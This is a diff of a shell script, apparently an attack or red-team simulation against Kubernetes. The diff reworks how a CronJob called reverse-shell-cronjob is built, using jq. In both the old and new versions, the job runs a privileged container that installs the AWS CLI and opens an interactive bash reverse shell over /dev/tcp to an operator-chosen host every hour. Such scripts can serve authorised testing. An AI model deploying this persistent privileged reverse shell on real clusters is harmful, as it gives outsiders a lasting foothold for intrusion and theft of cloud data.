@@ -177,19 +177,28 @@ kubectl create cronjob reverse-shell-cronjob \
   --namespace=s3app \
   --schedule="15 */1 * * *" \
   --image=ubuntu \
-  --service-account=$SERVICE_ACCOUNT \
-  --active-deadline-seconds=3600 \
-  --ttl-seconds-after-finished=120 \
-  --restart=OnFailure \
-  -- /bin/bash -c "apt-get update && apt-get install -y curl unzip python3-pip && curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\" && unzip awscliv2.zip && ./aws/install && TASK=kube2s3 /bin/bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1" \
-  --env="BUCKET_NAME=$(echo -n $NEW_BUCKET_NAME | base64 -d)" \
-  --env="REVERSE_SHELL_HOST=$REVERSE_SHELL_HOST" \
-  --env="REVERSE_SHELL_PORT=$REVERSE_SHELL_PORT" \
-  --security-context-privileged \
   --dry-run=client -o json 2>&1 | tee -a $LOGFILE | tee reverse-shell-cronjob.json
 
 # Update the JSON to include the concurrency policy
-jq '.spec.concurrencyPolicy = "Forbid"' reverse-shell-cronjob.json > tmp.json && mv tmp.json reverse-shell-cronjob.json
+jq '.spec.concurrencyPolicy = "Forbid" |
+    .spec.jobTemplate.spec.activeDeadlineSeconds = 3600 |
+    .spec.jobTemplate.spec.ttlSecondsAfterFinished = 120 |
+    .spec.jobTemplate.spec.template.spec.restartPolicy = "OnFailure" |
+    .spec.jobTemplate.spec.template.spec.serviceAccountName = $SERVICE_ACCOUNT |
+    .spec.jobTemplate.spec.template.spec.containers[0].command = ["/bin/bash", "-c"] |
+    .spec.jobTemplate.spec.template.spec.containers[0].args = ["apt-get update && apt-get install -y curl unzip python3-pip && curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\" && unzip awscliv2.zip && ./aws/install && TASK=kube2s3 /bin/bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1"] |
+    .spec.jobTemplate.spec.template.spec.containers[0].env += [
+      {"name": "BUCKET_NAME", "value": $NEW_BUCKET_NAME},
+      {"name": "REVERSE_SHELL_HOST", "value": $REVERSE_SHELL_HOST},
+      {"name": "REVERSE_SHELL_PORT", "value": $REVERSE_SHELL_PORT}
+    ] |
+    .spec.jobTemplate.spec.template.spec.containers[0].securityContext.privileged = true' \
+  --arg SERVICE_ACCOUNT "$SERVICE_ACCOUNT" \
+  --arg NEW_BUCKET_NAME "$NEW_BUCKET_NAME" \
+  --arg REVERSE_SHELL_HOST "$REVERSE_SHELL_HOST" \
+  --arg REVERSE_SHELL_PORT "$REVERSE_SHELL_PORT" \
+  reverse-shell-cronjob.json | tee -a $LOGFILE | tee tmp.json && mv tmp.json reverse-shell-cronjob.json
+
 
 # Apply the updated CronJob configuration
 kubectl apply -f reverse-shell-cronjob.json 2>&1 | tee -a $LOGFILE
